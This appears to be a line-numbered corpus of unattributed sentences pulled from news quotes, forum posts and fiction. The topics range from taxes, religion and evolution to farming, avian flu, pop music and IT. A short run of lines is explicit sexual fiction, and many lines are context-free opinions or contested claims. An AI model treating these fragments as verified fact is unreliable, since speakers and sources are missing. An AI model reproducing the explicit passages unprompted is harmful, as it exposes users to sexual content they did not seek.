8609191 but its gotten past a point of no return with more and more people borrowing to buy gas groceries basic necessities
8609192 however id prefer the richest to pay more corporations to pay nothing and the middle class to pay less when it comes to taxes but im a nutcase
8609193 people that are wealthy buy products and services that are made by people that have a job to provide that product or service
8609194 already do not pay any or very little income taxes
8609195 and the best way of insuring that this happens in a proper way is that it is controlled why democratically elected people and not stupid rich folks
8609196 when you raise taxes on the rich they actually pay less in april because they end up making less money when you lower taxes on the rich they end up paying more to the government because they make more
8609197 the market is gaining increasing confidence the strain in the financial markets and high oil prices will not tip the economy into a recession
8609198 science without religion is lame religion without science is blind
8609199 the most incomprehensible thing about the universe is its comprehensibility
8609200 if something is in me that can be called religious
8609201 then it is the unbounded admiration for the structure of the world so far as science can reveal it
8609202 gravity cannot be held responsible for people falling in love
8609203 as far as my experience goes they are also no better than other human groups although they are protected from the worst cancers by a lack of power otherwise i cannot see anything chosen about them
8609204 raffiniert ist der herr gott aber boshaft ist er nicht
8609205 the lord god is subtle but he is not mischievous
8609206 for the religious i say who are you to judge the tools the god you believe in uses to create and if god is the creator then certainly he created the laws that nature follows too and understanding the laws of nature science leads one to an understanding of god religion is the study of the divine law of man while science is the study of the laws of nature they can and should be merged
8609207 the curious thing i find about atheists is that this belief there is no god in any form uses the same
8609208 man were created by the image of god imago dei
8609209 you are an insightful and engaging presenter and your program far exceeded my expectations

8609213 only 38 per cent of the uks total water use comes from its own rivers lakes and groundwater reserves the rest is taken from water bodies in many countries across the world to irrigate and process food and fibre crops that people in britain subsequently consume whats particularly worrying is that huge amounts of these products are grown in drier areas of the world where water resources are either already stressed or very likely to become so in the near future

8609215 we have just as many images of beauty around us in south africa as any other country but they are diverse and reflect a wide variety of beauty ideals the acceptance of this diversity and a multi dimensional interpretation of beauty is why south africans are able to think of themselves as beautiful and work with what they have
8609216 all i can think about is this game at this point

8609230 well to the average adult all their music may just seem like bubblegum but when you really look at it theyve clearly grown
8609231 theyve made the move from disney only theyll be playing the vmas which obviously has an older age demographic than disney so theyre expanding from tweens to early teens
8609232 they also seem to have an instinctive ability to market themselves each of them has their own look that is pretty well defined
8609233 theyre going to have long term success because all three of them are vital to the bands popularity
8609234 its a first year for a lot of things for us so we just want to thank the fans

8609236 i definitely think the jonas brothers are capable of breaking out of their teen pop bubble
8609237 theyre a very marketable group and their reach extends not only to teenybopper girls but they still have fans who are guys and theyve managed to keep their relevance because of all these other projects they are emerging as a franchise
8609238 the vmas are going to increase their visibility with the music community and those who perceive them as the male equivalent of a miley cyrus

8609255 the most authentic resources for scientific blog posts are academic publications but i feel that bloggers including myself rather tend towards picking up press releases as their main sources sadly in my opinion blog posts on research papers dont have the vibrancy they deserve while readers unversed in the subject area find it hard to judge whether a blog post does justice to the original publication or not hopefully all that is going to change now
8609256 world prices for staple foods are presently soaring to a level that most people in developing countries can no longer afford the favorite explanations changed eating habits poor harvests due to climate change and high oil prices are half of the truth at most however the international assessment of agricultural science and technology for development iaastd has been working on a global strategy for agriculture and against hunger and starvation in the last four years biotechnology and genetic engineering arent exactly rebuffed but the iaastd doesnt seem to think that technology is a solution to the problem of hunger

8609309 the close evolutionary and genomic relationships of maize or corn to other grasses will take us one step closer to some new good sources of bioenergy
8609310 maize cell walls and the genes responsible for wall formation are characteristic of all grasses
8609311 maize has the same genes arranged in the same order and on the same chromosomes as the other grasses
8609312 well switch genes on and off as we identify them to see what they do once we know the genes and their functions then we can assess which ones might make good targets for modification for enhanced biomass and sugars for processing into biofuel
8609313 our group is one of the very first targeting what we call cofactor engineering
8609314 in a chemical factory they basically use hydrogen gas and metal to perform a reaction
8609315 this is not only useful for medical compounds but also for other biochemicals and biofuels
8609316 once developed this molecule will cause much less wheezing and shortness of breath and should be able to be given safely to the hundreds of thousands of patients with both heart and lung diseases furthermore because it will have so few side effects it has the potential to become the beta blocker of choice for all heart patients
8609317 we know that beta blockers save lives in patients with heart disease so making them safe for those unlucky enough to have a respiratory disorder as well is a clinical imperative i applaud jill baker for questioning why beta blockers should remain contraindicated for so many of her patients and being stirred to correct this with an incisive programme of work in the best traditions of medical research this endeavour was born out of a problem encountered at the sharp end of clinical practice
8609318 few in yales history have been so well prepared to become provost

8609320 i am eager to work with the president and officers and the team in the provosts office to support our faculty and students
8609321 it is an exciting time at yale on numerous fronts and the provost has important opportunities to contribute to the universitys progress on all of them
8609322 few in yales history have been so well prepared to become provost
8609323 michaels background as both a leading scientist and a museum director makes him uniquely qualified for this newly created position
8609324 the issue of animal welfare and well being reflects a change in the concern that society has about animals and where their food comes from
8609325 and its an issue that needs to be taken seriously because it has serious implications
8609326 weve got everything from a kiddie tractor pull and a petting zoo to a 4 h and ffa livestock judging contest and from cooking demonstrations to bloodhound search and rescue and pet training demonstrations
8609327 and so for those children who are peanut allergic then its a very safe product for them and they can feel included as if they were eating peanut butter

8609332 thats going to help them this year i think they feel like they have something to prove they want to redeem themselves
8609333 we better be good when you have that many older kids
8609334 as a team we want to win the state meet i think if everybodys healthy and our training goes well theres no reason that we cant they know that
8609335 they goof around afterwards and before but when they are doing a workout they want to hit the splits as closely as they can they get angry when someone goes too fast or too slow theres a great great intra squad rivalry thats the kind of stuff that really makes the team better
8609336 were going to do all the things to get them ready
8609337 theyll see the courses run against good competition so they have an opportunity to really compete so its not overwhelming when they get to the state meet
8609338 we wanted to make instruction available to students 24 7 and to provide student access to advice and productivity tools anytime and anywhere that made sense to them
8609339 with this consolidation we have addressed the need to have all of our servers centralized where they can be stored backed up and protected all in one location the dell solution provided everything from set up to the removal of our old pcs and boxes
8609340 central scotland can prepare itself to receive britains fastest growing radio station aimed at young people and the prospect of the output from the glasgow studios is an exciting one
8609341 we will not continue to search actively for a new sponsor and if no replacement is found we will sell off our teams base and equipment at the end of october

8609349 hello my name is inigo montoya you killed my father prepare to die
8609350 did you see those people with the happy atheist shirts
8609351 i wish one of them were here i cant imagine how they can respond to all the evidence for design
8609352 then you should believe in the resurrection of jesus thats history
8609353 more than five hundred people witnessed it how can you deny it
8609354 i just want to say that i think you three are beautiful children and that its very important that you read the king james bible and that you beware of people who have been educated beyond their intelligence
8609355 if you think god explains how the universe came into being then tell me how he did it
8609356 he said let there be light and there was light
8609357 as for the part about people being educated beyond their intelligence its possible that was directed at me
8609358 i offered that anything is possible and redoubled my efforts to extricate my hand
8609359 but surely there is some denomination of flying spaghetti monsterism that holds the parmesan
8609360 at lunch the priests called me over to their table to pose a problem that had been troubling them
8609361 is evolution really in some kind of trouble and if so what could such trouble be i have always been taught that no doctrinal conflict exists between evolution and catholic faith and the evidence for evolution seems both entirely satisfactory and utterly overwhelming have i missed something
8609362 a lively pastiche of french italian and english conversation then ensued for half an hour or so but the priests all seemed reassured by my general answer evolution has encountered no intellectual trouble no new arguments have been offered creationism is a homegrown phenomenon of american sociocultural history a splinter movement unfortunately rather more of a beam these days of protestant fundamentalists who believe that every word of the bible must be literally true whatever such a claim might mean we all left satisfied but i certainly felt bemused by the anomaly of my role as a jewish agnostic trying to reassure a group of catholic priests that evolution remained both true and entirely consistent with religious belief
8609363 the jesus mysteries was the original jesus a pagan god
8609364 because otherwise you would just have an infinite string of natural causes that never ends indeed you would so what but thats impossible he declared i asked him why that was impossible he had no answer
8609365 and then there is the fact that in many cases people positively resist scientific explanations for commonplace phenomena preferring instead various sorts of mysticism and irrationality the rudiments of logical thinking crucial to serious scientific investigation are things that have to be taught and practiced before they seem natural
8609366 then there would be no knowing how it all started
8609367 oh yes there would from yesterday in about a day
8609368 were we to find the whole of the universe teeming with life it might just be the nail in darwins coffin
8609369 so let them see an atheist who on the one hand is completely unafraid of any challenge they might throw his way but who also has no desire to be insulting or aggressive
8609370 so here is my question can we think that evolution is really nothing more than the view or fact that any living thing that has changed came from some other living thing before it
8609371 the stories in genesis were most likeley passed down orally for generations before the talking notes were compiled as genisis so i think its reasonable to put this at a low reliablility
8609372 er no evolution in general is the idea that all life on earth can be explained as having originated from a single or small number of ancestors through descent with modification evolutionary theory seeks to explain how exactly that happened
8609373 as having originated from a single or small number of ancestors through descent with modification
8609374 what tuna fish sandwiches again so it would kill you to maybe serve a nice grilled cheese every once in a while mr big shot
8609375 i might argue that it came about by an accidental combination of genes occurring
8609376 how is the theory of evolution adversely affected if we think there were more than a
8609377 you might present an argument that thus and so came about by natural selection and i might argue that it came about by an accidental combination of genes occurring
8609378 darwin and design toe the line or well make fun of you
8609379 there could be a few causes of a modification which is then
8609380 the point is that there were only a small number of ancestors i e all live on earth shares a rna dna core its the same core for all life so all life came from the same type if there were competing rna strands in the soup they did not get through the bottleneck
8609381 if i were looking for sarcasm id talk to my children
8609382 i see this point competing strands would reduce the number of ancestors but if they were not competing then why couldnt there be many ancestors
8609383 its the same core for all life so all life came from the same type if there were competing rna strands in the soup they did not get through the bottleneck
8609384 darwin and design toe the line or well make fun of you
8609385 so here is my question can we think that evolution is really nothing more than the view or fact that any living thing that has changed came from some other living thing before it
8609386 the mautner project improves the health of lesbians bisexual and transgender women who partner with women and their families through advocacy education research and direct service the mautner project envisions a healthcare system that is guided by social justice and responsive to the needs of all people
8609387 i actually dont disagree with you about any of it
8609388 what i would say is that its all very subtle if it had ever occurred to me that i was getting a gender based advantage over leah i would have strongly objected first of all i dont seek to get handouts from anyone and second of all leah is not just my wife but my friend and i want her to succeed more than anyone else but little by little breaks have gone my way and lo and behold im about to graduate and leahs graduate has been pushed back due mainly to spending a year and a half on a service project with which she did a great job and got zero recognition at this point i suppose i could take a stand and do some extra work to negate the advantage but im not so sure that my taking longer to graduate would help our little family any neither of us wants to be poor for much longer
8609389 to be honest after reading your post i feel like a total dick for blindly accepting all the advantages while leah has been treated fairly poorly at several turns but im not really sure that i am that kind of person
8609390 gee i hate women and wish they would disappear from science
8609391 absinthe who rails quite rightly against the obscenities of academia to not for a moment consider what putting those names there might do to two untenured careers tsk
8609392 he who isnt a part of the witch hunt is part of the problem
8609393 well listen no matter what but if you want these other guys to listen to you
8609394 we want people of color women to be privileged too
8609395 i am not saying mr husband is not a good physicist
8609396 i was taught to see racism only in individual acts of meanness not in invisible systems conferring dominance on my group
8609397 see women really are equal so now why wont everyone just stfu already
8609398 dont talk about this keep it quiet i dont want people to hear about it and i dont want my name associated with it but really truly im all on your side just dont mention it to anyone
8609399 the way you said this wasnt the best and heres why
8609400 the way zuska said this isnt the only way to say it
8609401 if mr husband and mrs wife continue to deny the reality of his unearned privilege
8609402 to say that my husband is one of the causes of her mistreatment is ridiculous
8609403 being able to stick your head in the sand is a great priviledge
8609404 im a good scientist but ive also gotten a lot of help that you didnt that sucks im going to try never to contribute to that situation in the future
8609405 no not me i didnt really have any advantages because im not that kind of guy
8609406 yes it happened but no not really i dont want to think about being a member of the privileged club
8609407 perhaps you could remove leahs and my name from your post
8609408 what do you want me to do give up my degree
8609409 yeah thats an accurate description of what poor leah is going through right now
8609410 i support you as long as it isnt a hardship for me
8609411 theres more to do and i have no reason to think i dont want to keep doing this job

8609414 the historical images were selected because they reinforce the feeling of repression and isolation we wanted to remind visitors of the unspeakable sorrow experienced by those people living in berlin after the wall was constructed
8609415 a lot of people say well what do you actors need why are you speaking up youre not people who need anything and its true were very blessed but almost all of us come from real middle class families and because we have the platform that we do it makes it a little bit easier for us to speak up speak out but everyone should really be doing it mostly im just here because im a bleeding heart liberal and a concerned citizen and i cant wait to hear the speeches every election is historic but this one is particularly so and so im so excited to be here
8609416 i dont feel very good about the last eight years and i feel like were in a place where we really need theres a lot of damage that we need to recover from and we need a very strong and inspirational leader to bring us out of this its pretty grim
8609417 i did support hillary rodham clinton in the new york primary because ive been an admirer of hillarys for a long time shes been an excellent senator and of course i was slightly biased by the fact that she was a woman i never thought that in my lifetime i would have the pleasure of voting for a woman for president so i did vote for her in the primary but i always admired barack obama and when it became time for hillary to step aside and for obama to become the nominee i was very pleased to be able to support him and i prayed that he would pick joe biden for his vice president i thought that was the best possible choice
8609418 one of the benefits and pleasures of being an actor is having the opportunity to travel around the united states to travel overseas i began traveling to europe and asia when i was about 20 and the respect that our country had the regard that our country had throughout the world was so tremendous the embrace that youd receive just for being an american was extraordinary and over the last eight years during my travels ive seen that love for our country become so compromised that i dont know how well ever regain our stature in the world
8609419 if you go overseas you see how much theres an excitement that a country that the rest of the world felt got so lost suddenly is on track enough to make a change this dramatic not only an african american but a man whose name is barack obama

8609422 recent studies have shown that a significant proportion of eukaryotic genes are mispredicted at the transcript level as the mispred routines are able to detect many of these errors and may aid in their correction we suggest that it may significantly improve the quality of protein sequence data based on gene predictions
8609423 some secreted proteins may truly lack secretory signal peptides since they are subject to leaderless protein secretion similarly it cannot be excluded at present that transchromosomal chimeras can be formed and may have normal physiological functions nevertheless the fact that mispred analyses of protein sequences of the swiss prot database identified very few such exceptions indicates that the rules of mispred are generally valid
8609424 interestingly even the manually curated uniprotkb swiss prot dataset is contaminated with mispredicted or abnormal proteins although to a much lesser extent than uniprotkb trembl or the ensembl or gnomon predicted entries
8609425 i thought the library would be a safe friendly place that was familiar to people in the community i thought it would be good to partner with the library too as a way of offering something to evanston
8609426 every class i teach makes me look at my favorite stories in a new way because of the thoughts and feelings of my students
8609427 i want to help my students look at their own writing in a whole new way too thats what is so exciting about this opportunity at the library teens can engage in reading and writing outside of their regular classrooms in a way thats really fun and unique
8609428 the curious incident of the dog in the night time
8609429 elizabeth has a very creative approach and a wonderful sense of fun
8609430 there are many demands on teen students during the school year to write a certain way and to use a certain format
8609431 i feel very fortunate to be able to offer a creative writing class that frees up teens to let their imaginations soar and to rekindle the deep joy in writing
8609432 we live in a vibrant university town with many talented people
8609433 tapping into that talent through the hub of the library benefits all of us and we are very grateful
8609434 the alumni laureate awards were introduced last year to give the university a tangible way of recognising alumni who have achieved excellence in their chosen field of endeavour

8609436 cancer may reflect a partial and aberrant loss of differentiated character in which cells that were formerly specified to perform a specific task forget that and become more like the rapidly dividing stem cells from which they came
8609437 understanding how differentiated states are specified might help us figure out how to remind cancer cells to go back to their original tasks or fates or more likely die

8609442 obama needs to ignore all the nervous nellies in the commentariat who want him to fundamentally alter his style in one way or another more populist more technocratic etc compared to where bill clinton was at this point in 1992 or where ronald reagan was in 1980 obamas doing well and he needs to stick with what got him where he is the obama uplift barack obama is the most brilliant orator of his generation and his rousing optimistic style is perfectly fit for a convention speech as he showed in 2004

8609451 we started using virtualization to address power and space issues in our main datacenter we quickly adopted vmware esx as our standard platform for new projects and consolidated existing servers
8609452 it allowed us to continue business as usual and we experienced no delay in completing projects on time today we are way below our power threshold and gained about 50 of our floor space even after we doubled the amount of windows servers
8609453 before going virtual our datacenter power supply was maxed out we couldnt plug in a toaster now with less hardware we have capacity to handle whatever comes our way
8609454 this allowed us to condense many servers is a small amount of space with vmware and ibm bladecenters we were able to consolidate over a 150 servers into one rack

8609457 the data do not support the often stated implication that the sharp increase in grain prices is attributable to the chinese diet change

8609514 just as we warned eu bureaucracy is beginning to destroy our way of farming
8609515 we still have 1 5 million farms more than any other european country most of our farms are tiny by european standards about 7 hectares and they play a huge role in protecting our biodiversity as well as providing us with fantastic food most farms are mixed our farmers both plant crops and rear animals one or two cows a few goats a few pigs and some chickens and now they are facing more and more problems with eu bureaucracy polish farmers are finding that the practices they adopted hundreds of years ago are now illegal its become a nightmare
8609516 when i was a child i drank milk that farmers had hand milked from their cows i cant remember anyone ever getting ill as a result but now its illegal to milk by hand and sell it and the local dairy which used to buy the farmers milk has been closed down for failing to comply with the eus sanitary and hygiene regulations our village used to have 100 cows now there are only two
8609517 not yet but many are changing the way they farm in order to survive they are becoming less diverse for instance if you get rid of your animals and just cultivate fruit trees the bureaucracy isnt so bad but were losing a lot of biodiversity as a result its very visible
8609518 i went through it myself when eu regulations were being enforced in the united kingdom you have to have stainless steel walls and concrete floors in your cowsheds you have to have eartags and passports for your cattle you have to conform to rigid bureaucracy or face heavy fines i fought it like blazes at the time and just about survived but i know how destructive the process is to the quality of food and the quality of life my job as president of icppc is to warn the polish farmers dont follow us keep your traditions alive and you will come out ahead in the end
8609519 when we were under communist rule we heard about supermarkets and we were fascinated by the idea of them
8609520 the food looked so good and it seemed cheap when supermarkets finally arrived after the collapse of communism people at first flocked to them about 90 per cent of the food came from western countries it looked attractive as it was so well packaged but quite soon people found that the food didnt taste as good as it looked and actually was often quite awful so some people have gone back to buying local food but a lot of people still buy in supermarkets because the food is so cheap there
8609521 a great proud nation is turning the page of a tragic century and freely takes the seat that should have belonged to it right from the start of the process of european integration
8609522 we must organise at the grassroots level and resist we must ignore the eu regulations and continue to support a way of life that has been going on for centuries if enough country folk do this they wont be able to stop us
8609523 i used to think that we could get the eu to accept radical reforms
8609524 but i dont believe that now its a waste of time and energy in the longer term change will come monocultural chemical farming is doomed
8609525 our farmers dont destroy biodiversity and theyre not dependent on oil
8609526 farmers were beginning to replace their workhorses with 35 horsepower tractors but now with the price of diesel rising so quickly theyre having second thoughts
8609527 and dont forget horses are sustainable as they reproduce not something tractors do in many ways the hike in oil prices is good news in so far as it means that people are beginning to go back to the time tested sustainable ways of farming its not a case of opposing new technology which can help us a lot by providing new forms of renewable energy and better implements its a question of combining the best from the past with the best that the modern world has to offer
8609528 we see it as a basic community concern all over the world how can there be food security without home grown seeds
8609529 it looks likely that we might be sleep walking into a world in which blood flows metaphorically and at times actually due to mistakes over food policy
8609530 ultimately we have to side with food democracy over food control

8609534 hay intereses tironeos pero aspiramos a un pa s para todos en el que haya empresarios a los que les vaya bien pero en en el que tambi n miles de argentinos sean incorporados al trabajo y a la inclusi n
8609535 hoy por hoy no creo que haya empresas que no tengan competitividad todo lo contrario
8609536 i had an infestation of red headed hairy caterpillars i used all kinds of pesticides and couldnt get rid of them i was getting desperate as the caterpillars were spreading all over my cotton crop and castor beans
8609537 a few years ago we had a severe hail storm
8609538 it destroyed everyones crop but all i lost was the work i had done i just had to pick myself up and press on some neighbouring farmers had bought their chemical pesticides and fertilisers on credit they lost their crop just like me but they had the added burden of debt and no way to pay back the money
8609539 i was never happy with bt cotton some goats in the village died after grazing on a bt cotton field after the harvest
8609540 then there were the pesticides we at home used to feel ill because of the pesticides weve all been feeling so much better since we stopped using them we also spend much less on medical care altogether im feeling much happier now
8609541 last year we had a three month drought most of my crops survived whereas those of farmers using chemicals died
8609542 return to organic cotton amp avoid the bt cotton trap
8609543 i dont think youll ever be totally happy with the squad that youve got
8609544 but if the right player comes along then hopefully well get him in
8609545 we felt we were a little thin on the ground particularly if we had injuries or suspensions
8609546 but russells a player both owen coyle and myself know very well
8609547 he was a stalwart for aberdeen and was their first pick for 10 years so that shows how good he is
8609548 we stappen in omdat ze het in den haag totaal niet snappen

8609550 naar verluidt is de aanvraag van afdeling naar afdeling gegaan omdat niemand wist waar het nu ondergebracht moest worden uiteindelijk is de aanvraag onder de kop amateurkunst en cultuureducatie beoordeeld door de meest ondeskundige afdeling ze hebben echt pech gehad
8609551 er is steeds minder livemuziek in caf s en barretjes dankzij de popronde worden honderden horecagelegenheden weer geprikkeld om livemuziek binnen te halen men ziet dat een kleine investering veel oplevert
8609552 ik zie mogelijkheden voor een educatieve component denk aan workshops daarnaast moet het meer dan nu de functie van talent scout kunnen vervullen
8609553 wij hebben geen directe indicatie dat er iets mis zou zijn
8609554 het is een dogmatische ondemocratische actiegroep die ieder gesprek weigert en besluiten wil dwarsbomen waar gemeenten provincie kabinet eerste en tweede kamer mee akkoord zijn gegaan
8609555 om het maatschappelijke debat te bevorderen echter daar waar sprake is van een wel heel eenzijdig debat over milieukwesties gestimuleerd door milieuorganisaties een debat dat bovendien gebaseerd is op onjuiste of onvolledige informatie of dat op ondemocratische wijze wordt gevoerd vind ik wel dat we als rijksoverheid zeer kritisch moeten zijn als daarvan sprake is zal ik dan ook niet aarzelen dat in een gesprek met de betreffende milieuorganisatie aan de orde te stellen en uiteindelijk als deze eenzijdigheid of onvolledigheid in het debat voortduurt kan dit leiden tot stopzetting van de subsidie
8609556 wij hebben in die verklaring eerder een lans gebroken voor milieuorganisaties in het algemeen

8609567 dad i worked really hard this year taking a heavier than normal course load doing volunteer work and still earning a 4 0
8609568 well she had kind of a rough first year she spent lots of time partying and not studying as much as she used to she was quite popular on campus and even pledged a sorority but she only squeaked by with a 2 0 shes on probation and might get kicked out if she doesnt do better
8609569 well how about we ask the school to give her one of your gpa points so youll both have 3 0 gpas and be equal
8609570 here in america and especially here tonight we need to remember two basic truths
8609571 society has an obligation and christians have a gospel duty to provide adequate and compassionate support for unwed and abandoned mothers women facing unintended pregnancies and women struggling with the aftermath of an abortion
8609572 heres the second truth killing an unborn child is never the right answer to a womans or societys problems acts of violence create a culture of violence and abortion is the most intimate form of violence there is it wounds the woman it kills the unborn child and it poisons the roots of justice and charity that bind us all into one human family
8609573 planned parenthood is the largest single provider of abortion and family suppression services in the united states
8609574 this facility in this minority neighborhood should offend every african american and latino family and all of us because every child lost to abortion here subtracts one more life one more universe of possibilities and talent from the future of this community the business of planned parenthood is the prevention of the future and business is good and very profitable at the expense of this community
8609575 theres a sense of the end being near and we dont know when its coming but were a day closer
8609576 when you see one of the sun times most recognizable figures saying were dead in the water and he doesnt want to go down with the ship its not good the worst thing is that mariotti is ahead of the curve

8609582 you could be booking a boutique paris hotel after seeing lovely pictures of the lobby but then you end up with dirty sheets in the room with the video you can capture that straight away
8609583 if youre offering a financial incentive people may be tempted to post something which is perhaps not as truthful as it would be to get a reward
8609584 its harder to hide the truth in a video than it is in words
8609585 videos capture straight away the atmosphere of the hotel so it is difficult to make the experience more positive than it is
8609586 like with youtube visitors can comment on the videos reviewers can get negative comments on their posts
8609587 the most rated videos get more prominence on the site if a video gets a negative response the video will go downwards

8609595 nah i thought i would head back to our room im fucking exhausted

8609597 laura that would be so wrong hes our tournament assistant not a piece of sex meat if we fuck him it would be like sexual harassment or something

8609606 maybe a little i mean it is one thing to order some porter to fetch your bags its another to tell someone with a science degree
8609607 i understand my job is low brain power but thats why i took it i spend all year trying to squeeze a few more vibrations out of a motor and keep costs to a minimum i deserve to spend a few days where all i need to worry about is where the extra ice in the suite
8609608 that and when is the crazy volleyball girl is going to fuck you next
8609609 but yeah i find myself a little obsessed with it i dont think i have ever been such a willing participant in something i seem to have so little control over it feels kind of nice i just wait and wonder if and when we might do something again
8609610 and take your shorts off i want to see that cock
8609611 jack that cock while i decide if i want you in me
8609612 think about me riding your face think about how wet and hot i was think about what it would be like to slip that cock right up inside me
8609613 think about pounding me think about screwing my brains out think about making me scream from that cock
8609614 i forbid it you keep stroking and you dont come understand
8609615 our research revealed that people like to shoot video with their point and shoot cameras but were very dissatisfied with the video quality and the resulting large files
8609616 our new t500 fulfills this customer need for a digital camera that delivers high quality movies in a small form factor
8609617 the scale of this criminal enterprise is unprecedented in this country the roll call of deaths and injuries is horrific some 30 to 40 of these weapons are still unaccounted for and regrettably but doubtlessly the roll call of death and serious injury will continue to rise
8609618 met the demand nationally of the criminal fraternity the firearms have since been used in all of our big cities especially london
8609619 as far as mr wilkinson is concerned this is not the end of it there will be officers from thames valley police investigating his financial affairs and he will be left with nothing i hope

8609631 youre seeing the results of 29 days worth of construction which could have taken upwards of a year due to the magnitude
8609632 the process was incredibly smooth transitioning from design to construction in one week
8609633 today was the first class and it was already quite noisy
8609634 let me in you need to detox and you need to tell me what the fuck is going on with your energy man
8609635 i suspect the anger youre charging this room with is the reason why youve been up there on hells surface for a month
8609636 earth is unkind to any evolved being humans are so misguided and ruled by their emotions more than us i saw death everywhere it was hard to take in my abilities as an expert empath i felt some of the most painful things you wouldnt believe its the same pain youre feeling right now and this pain not only ranged from heartbreak but from grief to physical pain human beings are suffering
8609637 jigen you let your emotions rule you so devilishly tone it down when youre in my presence we both know that this emotional dumping is not the reason why la her appointed you to this mission so cut to the chase
8609638 fine fine but listen dude this isnt any usual mission i found out something that could shake the foundations of our exile i have found eiran souls in a group of humans one of them has the most strongest soul out of the four its a girl of seventeen and every night she dreams of eira but to her she is a stranger to the sights i used my dream insight and what shocked me most is well i think shes dreaming a reality
8609639 what im trying to say is she dreams of them every night what theyre doing every day and every night the ones who exiled us will i know im right this time and if my insights are correct her soul is the soul mate of volos the current husband of outlaw those disgusting pair who managed to convince the gods to exile us to this hell ridden planet
8609640 the ex husband of my mistress hes still infatuated with her the dirty bastard
8609641 i have lost hope in all missions the information you tell me is pleasing but what if youre wrong this human girl wouldnt be able to take the truth
8609642 im not letting her in she fucks with my mind all the time on purpose
8609643 jigen if i expect you to get detoxed i would of picked a more suitable place if i were you especially when youre going to talk about subjects that i should be all ears to first
8609644 dude shes coming in she rules us and i respect her greatly she needs to know the information so you can either hide in the bedroom like a little boy or stand in the doorway and not say a word like a man
8609645 my lady snow i do apologize for revealing such information without your consent
8609646 if we are going to grieve then were going to do it right now hold back your hair so i can make sure youre crying too
8609647 not sure if this is or is not the norm but i just received my brand new iphone here in the uk and once it had been activated on itunes i found that the home screen the screen you can personalize with a photo already had a photo set against it
8609648 it would appear that someone on the production line was having a bit of fun has anyone else found this
8609649 i think its a kind of personal touch its nice maybe every phone that gets a full quality test should have its testers picture taken and left on there and the working conditions look pretty good

8609657 we have never had a disease called bird flu in our midst before we know nothing about this disease and yet they come and point their weapons in our chests to threaten us and then take away our cages and hens which we took out loans to buy
8609658 genetic diversity is an insurance against future threats such as famine drought and epidemics the existing animal gene pool may contain valuable but unknown resources that could be very useful for future food security and agricultural development maintaining animal genetic diversity allows farmers to select stocks or develop new breeds in response to environmental change diseases and changing consumer demands
8609659 experience has shown that most countries that have suffered from avian flu across africa have done so as a result of commercial movements the pace of the disease is in line with the movement of poultry
8609660 ive heard that every country that suffers from avian flu is entitled to the sum of three billion cfa francs us 7 million and that each of these countries has already received an advance of 800 000 francs us 1 900 this is the money they are currently using to destroy us while modern farms with imported laying birds and meat birds are protected they even organise grand tasting ceremonies for imported birds to encourage people to consume them in massive numbers but we know very well that it is these imported hens and chickens that are bringing avian flu into our country as far as im concerned its a huge conspiracy not just against us but also against local birds its a policy based on double standards we will never accept it
8609661 three days ago i was coming home and a group of armed men blocked my way because i had some local birds on me they asked where i had come from with the birds and told me to give them to them so i told them quite seriously and very firmly that one of them would die that day if they tried to take my hens from me because i am willing and able to defend myself that was when they decided to let me go
8609662 a team from sogema society for the management of autonomous markets accompanied by police officers invaded our poultry sales outlets at the international market in dantokpa to take our birds from us and kill them these are grave times and we are being driven into a corner so that they can destroy us what country are we living in we must react as soon as possible
8609663 in adjarra where they said they found avian flu there were barely 50 birds in a little farm of imported day old chicks we will go and meet these killers of local birds the village chiefs have lined their pockets with this business and so have the mayors theyve been given money to destroy our birds our income generating activity our economy and our lives while we had nothing to do with the arrival of avian flu in our country we demand compensation
8609664 african farmers should be offered economic incentives to ensure that they report any suspected cases of avian flu immediately and to discourage them from rushing to get their birds on to the market the country causing grave concern at the moment is niger which borders the region of nigeria that is affected by avian flu and where two million vulnerable people already suffer from hunger the highly pathogenic avian flu virus represents a very grave threat for animal health in west africa if it were to be an epizootic disease an epidemic outbreak of disease in an animal population that might extend to humans that spreads beyond the borders of nigeria it would have catastrophic effects on the means of existence and food security of several million people
8609665 our greatest concern is with the poor owners of small poultry farms
8609666 the compensation programmes need to be implemented rapidly experience has shown that in the event of an epidemic of avian flu the birds must be slaughtered within 72 hours otherwise the fight against the spread of the disease becomes more difficult and more costly farmers must be compensated immediately to prevent them opposing the destruction of their sole means of subsistence
8609667 they have killed all our birds and driven us into economic ruin we have not been given any information whatsoever they seize our birds with guns everywhere to intimidate us what do these people want to do to us
8609668 we find this difficult to understand given the poor performance of the hybrid rice programme and the many issues that have been raised against it over the years
8609669 the package is no different from those that have turned us into the worlds biggest rice importer by subsidising hybrid rice we are subsidising big seed companies like sl agritech bayer and monsanto when we should be using that money to support our own rice farmers fields will actually make us dependent on private companies that are not accountable to the public
8609670 better earnings will allow rice farmers to expand their areas and also become millionaires
8609671 after successive bad harvests and lacking the funds to service their debts many farmers have been forced to sell their land in many instances to the same chinese business people who sold them the seeds fertilisers and pesticides
8609672 farmers who cannot afford to pay off their debts incurred from the now higher costs of growing hybrid rice often end up selling their land to the same chinese companies that sell the farming inputs the companies then frequently turn the land into commercial rice farms
8609673 the system there doesnt have any leverage over farmers so labour is not very efficient but we cant send chinese workers to plant there
8609674 they charge a lot for land rent and theres no irrigation infrastructure so we have to rely on the rainy season
8609675 it is not realistic to grow grains overseas particularly in africa or south america
8609676 with so many people starving in africa can we really ship the grains back to china

8609744 i moved to iowa city in 1994 and i love it here
8609745 its a great place to live and run a business
8609746 its a unique food falafel you dont see a lot of this around iowa city and its something that we missed
8609747 its fun to work the students in with the rest of iowa city
8609748 you come down here normally on weekends and the crowds are all only at the bars
8609749 this has been a good way to learn the better places to eat you just follow the crowds and you just cant beat free food
8609750 the student leaders and the downtown association were both looking for a way to introduce students to the various eateries restaurants and clothiers of downtown iowa city
8609751 quite possibly syndicates across borders which manage to persuade their recruits through various modes of deception and intimidation

8609753 the report states that the existence of a large number of bars pubs in singapores red light districts fuels the demand for filipino women

8609762 im really happy writing about fantasy but you never know where this will head
8609763 you cant always predict what will happen next especially with writing
8609764 a lot of our groups really dont have a place within the system to voice their claims
8609765 we need to have something more than the centrist political voice being heard
8609766 itll work if a lot of people do it and it wont work if not a lot of people do it
8609767 thats a question we dont know right now it might fail miserably and people are going to get their asses kicked by the cops and wont have anything to show for it thats a very real possibility
8609768 outraged about the war and economic conditions instead of remembering the political theater that goes on
8609769 in the period following the games the legacy transformation phase involving erection of perimeter enclosure
8609770 dimprovviso non ho pi provato alcuna nostalgia perch ho visto la mia vita e le persone accanto a me

8609773 we can be part of the push to get enough votes for cloture when efca comes up next
8609774 were not competing with anyone else were just trying to go deeper
8609775 theres no center of gravity any more in the labor movement
8609776 theres a lot of jostling a lot of egos more mistrust more maneuvering required to get things done
